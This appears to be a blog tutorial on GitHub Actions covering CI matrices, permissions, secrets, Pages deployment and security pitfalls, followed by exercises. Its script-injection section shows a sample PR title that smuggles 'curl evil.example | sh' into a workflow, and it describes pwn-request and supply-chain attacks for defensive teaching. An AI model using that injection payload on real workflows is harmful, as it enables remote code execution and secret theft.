<ul>
<li><code>${{ ... }}</code> is an <strong>expression</strong>. It reads <strong>contexts</strong> such as <code>github</code>, <code>matrix</code>, <code>secrets</code>, <code>steps</code> and <code>env</code>.</li>
<li><code>run:</code> uses bash on Linux and macOS runners and PowerShell (<code>pwsh</code>) on Windows runners. Set <code>shell: bash</code> or <code>shell: pwsh</code> to choose.</li>
<li>Runner labels (checked September 2026): <code>ubuntu-latest</code> is Ubuntu 24.04 (<code>ubuntu-26.04</code> also exists), <code>windows-latest</code> is Windows Server 2025, <code>macos-latest</code> is macOS 26 on Arm. <code>-latest</code> moves over time; pin a version like <code>ubuntu-24.04</code> when you need stability.</li>
</ul>
<blockquote>
<p><strong>Watch out:</strong> YAML reads <code>3.10</code> as the number <code>3.1</code>. Always quote versions: <code>python-version: &quot;3.10&quot;</code>.</p>
</blockquote>

<p>How it works:</p>
<ul>
<li>The <strong>matrix</strong> makes 5 test jobs: 4 Python versions on Ubuntu plus 1 on Windows. <code>fail-fast</code> is <code>true</code> by default, which cancels the others on the first failure.</li>
<li><code>cache: pip</code> saves pip's download cache between runs. The key comes from the file in <code>cache-dependency-path</code>, so a changed pin gives a fresh cache.</li>
<li>Artifact names must be unique in a run, so the name includes the matrix values.</li>
<li>Why 3.11–3.14: Python 3.10 reaches end of life in October 2026, and 3.15 is scheduled for 2026-10-01. To try a pre-release, add <code>&quot;3.15&quot;</code> to the list and <code>allow-prereleases: true</code> to <code>setup-python</code>.</li>
</ul>
<p>Then make the checks <strong>required</strong>: in the repository settings, add a branch ruleset for <code>main</code> that requires the <code>lint</code> and <code>test</code> status checks. Now a red build blocks the merge button.</p>
<blockquote>
<p><strong>Trick:</strong> keep CI fast. Put cheap checks (lint, type check) first with <code>needs:</code>, so a typo fails in 30 seconds instead of after a 10-minute matrix. Put slow integration tests (Dev Essentials 15 · Testing) in their own job.</p>
</blockquote>
<blockquote>
<p><strong>Common pitfall:</strong> a cache is a speed-up, never a source of truth. A job must still pass with an empty cache.</p>
</blockquote>

<h1 id="Chapter-4-—-Secrets-artifacts-environments-and-permissions"><a href="#Chapter-4-—-Secrets-artifacts-environments-and-permissions" class="headerlink" title="Chapter 4 — Secrets, artifacts, environments and permissions"></a>Chapter 4 — Secrets, artifacts, environments and permissions</h1>
<h2 id="The-GITHUB_TOKEN-and-permissions"><a href="#The-GITHUB_TOKEN-and-permissions" class="headerlink" title="The GITHUB_TOKEN and permissions:"></a>The <code>GITHUB_TOKEN</code> and <code>permissions:</code></h2>
<p>At the start of every job, GitHub creates a fresh <code>GITHUB_TOKEN</code> for that repository. It expires when the job finishes (at most 6 hours on GitHub-hosted runners). What it may do is set by <code>permissions:</code>:</p>
<pre><code class="language-yaml"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span></pre></td><td class="code"><pre><code class="yaml"><span class="line"><span class="hljs-attr">permissions:</span></span><br><span class="line">  <span class="hljs-attr">contents:</span> <span class="hljs-string">read</span>          <span class="hljs-comment"># workflow default for every job</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-attr">jobs:</span></span><br><span class="line">  <span class="hljs-attr">release:</span></span><br><span class="line">    <span class="hljs-attr">permissions:</span></span><br><span class="line">      <span class="hljs-attr">contents:</span> <span class="hljs-string">write</span>     <span class="hljs-comment"># this job only: may push tags / create releases</span></span><br><span class="line"> </span></code></pre></td></tr></table></figure></code></pre>
<ul>
<li>As soon as you list <strong>any</strong> permission, every permission you did not list becomes <code>none</code>.</li>
<li><code>permissions: {}</code> gives no permissions at all.</li>
<li>Set the default at the top to read-only, and raise it only in the job that needs more.</li>
</ul>
<h2 id="Secrets"><a href="#Secrets" class="headerlink" title="Secrets"></a>Secrets</h2>
<p>Add secrets in the repository settings, then pass them to steps through <code>env:</code>:</p>
<pre><code class="language-yaml"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span></pre></td><td class="code"><pre><code class="yaml"><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Smoke</span> <span class="hljs-string">test</span> <span class="hljs-string">against</span> <span class="hljs-string">staging</span></span><br><span class="line">        <span class="hljs-attr">env:</span></span><br><span class="line">          <span class="hljs-attr">API_TOKEN:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.STAGING_API_TOKEN</span> <span class="hljs-string">}}</span></span><br><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">scripts/smoke_test.py</span>      <span class="hljs-comment"># reads os.environ[&quot;API_TOKEN&quot;]</span></span><br><span class="line"> </span></code></pre></td></tr></table></figure></code></pre>

<li>Values are masked in logs, but GitHub says redaction is <strong>not guaranteed</strong>: a secret that is transformed (base64, split, JSON) may appear in clear text.</li>
<li>Anyone with <strong>write</strong> access to the repo can write a workflow that reads the secrets.</li>
<li>Except for <code>GITHUB_TOKEN</code>, secrets are <strong>not</strong> passed to workflows triggered by pull requests from <strong>forks</strong>, and the token is read-only there.</li>
</ul>

<h1 id="Chapter-5-—-CD-deploy-a-static-site-to-GitHub-Pages"><a href="#Chapter-5-—-CD-deploy-a-static-site-to-GitHub-Pages" class="headerlink" title="Chapter 5 — CD: deploy a static site to GitHub Pages"></a>Chapter 5 — CD: deploy a static site to GitHub Pages</h1>
<p>GitHub Pages hosts static files. A <strong>project site</strong> is served at <code>https://&lt;owner&gt;.github.io/&lt;repository&gt;/</code>; a <strong>user site</strong> comes from a repository named <code>&lt;owner&gt;.github.io</code> and is served at the root. There are two ways to publish:</p>
<table>
<thead>
<tr>
<th>Source</th>
<th>How it works</th>
</tr>
</thead>
<tbody>
<tr>
<td>Deploy from a branch</td>
<td>Pages serves (or builds with Jekyll) a branch such as <code>gh-pages</code>.</td>
</tr>
<tr>
<td><strong>GitHub Actions</strong></td>
<td>Your workflow builds the site, uploads it as a Pages artifact, and deploys it.</td>
</tr>
</tbody>
</table>
<p>To use the second way: <strong>Settings → Pages → Build and deployment → Source: GitHub Actions</strong>. Then the workflow has two jobs:</p>
<ol>
<li><strong>build</strong>: check out, build, then <code>actions/upload-pages-artifact@v5</code> packs the folder into an artifact named <code>github-pages</code> (a gzip tar; kept 1 day by default).</li>
<li><strong>deploy</strong>: <code>actions/deploy-pages@v5</code> publishes that artifact. It needs <code>pages: write</code> (to create the deployment) and <code>id-token: write</code> (to get an OIDC token that proves which workflow and branch the deployment comes from). It runs in the <code>github-pages</code> environment.</li>
</ol>
<p><code>actions/configure-pages@v6</code> is optional. It reads the site's metadata (for example <code>base_path</code>, such as <code>/my-repo</code>) and can adjust a few generators' configs. It needs <code>pages: read</code>.</p>
<p>Usage limits (GitHub docs): the published site may be at most 1 GB, a deployment times out after 10 minutes, and there is a soft bandwidth limit of 100 GB per month.</p>
<blockquote>
<p><strong>Watch out:</strong> with branch publishing, Jekyll skips folders that start with <code>_</code>, such as Next.js's <code>_next/</code>, unless the branch has a <code>.nojekyll</code> file. With the GitHub Actions source, your workflow does the build and the artifact is published as it is. Also, <code>upload-pages-artifact</code> v4 and later leave out dotfiles unless you set <code>include-hidden-files: true</code> (added in v5).</p>
</blockquote>
<p>The full workflow is in the next chapter, applied to this blog.</p>

<h1 id="Chapter-7-—-Security-the-traps"><a href="#Chapter-7-—-Security-the-traps" class="headerlink" title="Chapter 7 — Security: the traps"></a>Chapter 7 — Security: the traps</h1>
<h2 id="pull_request-vs-pull_request_target"><a href="#pull_request-vs-pull_request_target" class="headerlink" title="pull_request vs pull_request_target"></a><code>pull_request</code> vs <code>pull_request_target</code></h2>
<table>
<thead>
<tr>
<th>Event</th>
<th>Runs code from</th>
<th>Secrets</th>
<th><code>GITHUB_TOKEN</code> for fork PRs</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pull_request</code></td>
<td>the PR's merge commit</td>
<td>not passed for fork PRs</td>
<td>read-only</td>
</tr>
<tr>
<td><code>pull_request_target</code></td>
<td>the <strong>base</strong> repository's default branch</td>
<td><strong>available</strong></td>
<td>can have write access</td>
</tr>
</tbody>
</table>
<p><code>pull_request_target</code> exists so a workflow can, for example, label or comment on PRs from forks. It is safe <strong>only if it never runs the PR's code</strong>. The classic &quot;pwn request&quot; does exactly that: it checks out the fork's head commit and runs <code>npm install</code> or a test script in a job that holds secrets and a write token. The attacker's <code>package.json</code> then runs with those rights.</p>
<p>GitHub has tightened this twice. Since 2025-12-08, <code>pull_request_target</code> always takes the workflow file and checkout ref from the default branch. And <code>actions/checkout@v7</code> (backported to older majors on 2026-07-20) refuses to check out fork PR code in <code>pull_request_target</code> and <code>workflow_run</code> workflows unless you set <code>allow-unsafe-pr-checkout: true</code>, a name meant to stand out in review. Workflows pinned to an older SHA or exact version do <strong>not</strong> get the backport.</p>
<blockquote>
<p><strong>Watch out:</strong> <code>workflow_run</code> has the same problem: it runs with secrets after a PR workflow finishes. Treat any artifact it downloads from that PR as untrusted data.</p>
</blockquote>
<h2 id="Script-injection"><a href="#Script-injection" class="headerlink" title="Script injection"></a>Script injection</h2>
<p><code>${{ }}</code> is pasted into the script <strong>before</strong> the shell runs. A PR titled <code>a&quot;; curl evil.example | sh; echo &quot;</code> becomes code:</p>
<pre><code class="language-yaml"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span></pre></td><td class="code"><pre><code class="yaml"><span class="line">      <span class="hljs-comment"># UNSAFE: the title is inserted into the script text</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="line">          echo &quot;Title is ${{ github.event.pull_request.title }}&quot;</span><br><span class="line"></span></span><br><span class="line">      <span class="hljs-comment"># SAFE: pass it as an environment variable; the shell treats it as data</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">env:</span></span><br><span class="line">          <span class="hljs-attr">TITLE:</span> <span class="hljs-string">${{</span> <span class="hljs-string">github.event.pull_request.title</span> <span class="hljs-string">}}</span></span><br><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="line">          echo &quot;Title is $TITLE&quot;</span><br><span class="line"></span></span></code></pre></td></tr></table></figure></code></pre>
<p>Treat titles, branch names, issue bodies, commit messages and labels as untrusted input.</p>
<h2 id="Third-party-actions-the-tj-actionschanged-files-compromise"><a href="#Third-party-actions-the-tj-actionschanged-files-compromise" class="headerlink" title="Third-party actions: the tj-actions/changed-files compromise"></a>Third-party actions: the <code>tj-actions/changed-files</code> compromise</h2>
<p>On 2025-03-14 and 15, an attacker who had obtained a token with access to the popular <code>tj-actions/changed-files</code> action moved its version tags (v1 up to v45.0.7) to a malicious commit (CVE-2025-30066). The injected code read the runner's memory and printed secrets into the build logs, which are public for public repositories. More than 23,000 repositories used the action. CISA's alert covers it together with a compromise of <code>reviewdog/action-setup@v1</code> (CVE-2025-30154) around the same time, which may have enabled it. The fixed release is v46.0.1. Workflows pinned to the full SHA of an earlier clean commit kept running that clean code, because moving a tag does not change an existing commit.</p>
<p>Defences, in order of effort:</p>
<ol>
<li><strong>Least privilege</strong>: read-only default <code>permissions:</code>, secrets only in the jobs that need them, environments with reviewers for deploy keys.</li>
<li><strong>Fewer third-party actions</strong>: a few lines of shell or an official action are often enough.</li>
<li><strong>Pin by full SHA</strong> and let Dependabot propose updates you review.</li>
<li><strong>Organisation policy</strong>: allow-lists of actions; since August 2025 policies can also <strong>require</strong> SHA pinning (unpinned workflows fail) and block a named action with a <code>!</code> prefix during an incident.</li>
<li><strong>Lint your workflows</strong>: <code>actionlint</code> finds syntax and expression bugs; <code>zizmor</code> is a static analyser for Actions security issues.</li>
<li><strong>If an action you use is compromised</strong>: stop using it, search your logs for leaked values, and <strong>rotate</strong> every secret the workflow could see.</li>
</ol>

<h1 id="Practice-Exercises"><a href="#Practice-Exercises" class="headerlink" title="Practice Exercises"></a>Practice Exercises</h1>
<h2 id="Exercise-1-—-Read-a-workflow"><a href="#Exercise-1-—-Read-a-workflow" class="headerlink" title="Exercise 1 — Read a workflow"></a>Exercise 1 — Read a workflow</h2>
<p>In the CI workflow of Chapter 3: how many jobs run on a push to <code>main</code>, and in which order? What happens to a running CI job when you push again to the same PR?</p>
<details>
<summary>Solution</summary>
<p>Six jobs: <code>lint</code> first, then five <code>test</code> jobs (4 Python versions on Ubuntu + 1 on Windows) in parallel, because <code>test</code> has <code>needs: lint</code>. A new push to the same PR has the same <code>concurrency</code> group (<code>ci-refs/pull/&lt;n&gt;/merge</code>), and <code>cancel-in-progress: true</code> cancels the older run.</p>
</details>
<h2 id="Exercise-2-—-The-YAML-number-trap"><a href="#Exercise-2-—-The-YAML-number-trap" class="headerlink" title="Exercise 2 — The YAML number trap"></a>Exercise 2 — The YAML number trap</h2>
<p>A teammate writes <code>python-version: [3.9, 3.10, 3.11]</code>. The 3.10 job fails with &quot;version 3.1 not found&quot;. Why, and how do you fix it?</p>
<details>
<summary>Solution</summary>
<p>YAML parses unquoted <code>3.10</code> as the float <code>3.1</code>. Quote every version: <code>python-version: [&quot;3.10&quot;, &quot;3.11&quot;, &quot;3.12&quot;]</code>. Also drop 3.9: it reached end of life in October 2025.</p>
</details>
<h2 id="Exercise-3-—-Least-privilege"><a href="#Exercise-3-—-Least-privilege" class="headerlink" title="Exercise 3 — Least privilege"></a>Exercise 3 — Least privilege</h2>

<h2 id="Exercise-4-—-Fix-the-injection"><a href="#Exercise-4-—-Fix-the-injection" class="headerlink" title="Exercise 4 — Fix the injection"></a>Exercise 4 — Fix the injection</h2>
<p>This step posts a greeting on new issues. Make it safe.</p>
<pre><code class="language-yaml"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span></pre></td><td class="code"><pre><code class="yaml"><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">echo</span> <span class="hljs-string">&quot;Thanks for opening &#x27;$<span class="hljs-template-variable">{{ github.event.issue.title }}</span>&#x27;&quot;</span></span><br><span class="line"> </span></code></pre></td></tr></table></figure></code></pre>
<details>
<summary>Solution</summary>
<pre><code class="language-yaml"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span></pre></td><td class="code"><pre><code class="yaml"><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">env:</span></span><br><span class="line">          <span class="hljs-attr">ISSUE_TITLE:</span> <span class="hljs-string">${{</span> <span class="hljs-string">github.event.issue.title</span> <span class="hljs-string">}}</span></span><br><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">echo</span> <span class="hljs-string">&quot;Thanks for opening &#x27;$ISSUE_TITLE&#x27;&quot;</span></span><br><span class="line"> </span></code></pre></td></tr></table></figure></code></pre>

</details>

<p>Rewrite the 2022-era Hexo workflow so it deploys through the Pages artifact actions, with no SSH key.</p>
<details>
<summary>Solution</summary>
<p>Use the &quot;modern workflow&quot; from Chapter 6 and change only the build steps:</p>
<pre><code class="language-yaml"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span></pre></td><td class="code"><pre><code class="yaml"><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npx</span> <span class="hljs-string">hexo</span> <span class="hljs-string">generate</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/configure-pages@v6</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-pages-artifact@v5</span></span><br><span class="line">        <span class="hljs-attr">with:</span></span><br><span class="line">          <span class="hljs-attr">path:</span> <span class="hljs-string">public</span></span><br><span class="line"> </span></code></pre></td></tr></table></figure></code></pre>
<p>Then set <strong>Source: GitHub Actions</strong> in the Pages settings of the repository that runs it, delete the <code>HEXO_DEPLOY_PRIVATE_KEY</code> secret, and remove the matching deploy key from the target repository. <code>hexo-deployer-git</code> and the <code>deploy:</code> section of <code>_config.yml</code> are no longer used. Note the site now comes from <strong>this</strong> repository's Pages site; if the old target was a user site repository, move the workflow there or keep a project-site URL.</p>
</details>
<h2 id="Exercise-6-—-Pin-and-watch"><a href="#Exercise-6-—-Pin-and-watch" class="headerlink" title="Exercise 6 — Pin and watch"></a>Exercise 6 — Pin and watch</h2>
<p>Pin every action in your Pages workflow to a full SHA with a version comment, and add a Dependabot config. How do you find the SHA for <code>actions/checkout</code> v7.0.1?</p>
<details>
<summary>Solution</summary>
<p>The same command works in Git Bash and PowerShell:</p>
<pre><code class="language-bash"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">git ls-remote https://github.com/actions/checkout refs/tags/v7.0.1</span><br><span class="line"> </span></code></pre></td></tr></table></figure></code></pre>
<p>If the output also shows a <code>refs/tags/v7.0.1^{}</code> line, that is an annotated tag and the <code>^{}</code> SHA is the commit to pin. Then write <code>uses: actions/checkout@&lt;sha&gt; # v7.0.1</code> and add the <code>.github/dependabot.yml</code> from Chapter 6.</p>
</details>
